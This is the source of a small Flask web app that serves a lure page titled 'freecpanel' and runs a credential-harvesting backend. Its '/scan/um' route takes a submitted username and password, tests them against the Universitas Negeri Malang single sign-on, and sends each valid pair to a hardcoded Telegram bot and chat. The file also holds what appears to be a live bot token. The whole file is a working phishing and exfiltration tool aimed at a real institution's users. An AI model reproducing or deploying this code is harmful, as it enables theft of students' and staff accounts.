from flask import Flask, request, render_template, make_response
import requests as req
from bs4 import BeautifulSoup as  bs
import json
import random
import string

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/freecpanel', methods=['GET', 'POST'])
def asu():
    return render_template('asu.html')
        

@app.route('/scan/um', methods=['GET', 'POST'])
def mum():
    username = request.args['user']
    password = request.args['pass']
    return um(username, password)

def um(usr, pwd):
    ses = req.Session()
    url = "https://auth.um.ac.id/auth/core/service.php?"
    tok = bs(ses.get('https://auth.um.ac.id/auth/core/service.php?AuthState=_cf1f90ab6ba618641f92774c0e2f1db1ba33274e81%3Ahttps%3A%2F%2Fauth.um.ac.id%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fsiakad.um.ac.id%26cookieTime%3D1635567585%26RelayState%3Dhttp%253A%252F%252Fsiakad.um.ac.id%252F').text,"html.parser").findAll("input")[3]["value"]
    dat = {'username':usr, 
        'password':pwd,
        'AuthState':tok}
    post = ses.post(url,data=dat).text
    if 'Masuk' in post:
        return 'salah'
    else:
        token = '5086163151:AAHyqeiUjf4KPycpGSg9sjRc5qQLpxe4U3Y'
        chatid = '1884067981'
        pesan = F"{usr}:{pwd}"
        url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text={pesan}"
        kirim = req.get(url)
        return kirim.json()
    
if __name__ == '__main__':
    app.run(debug=True)
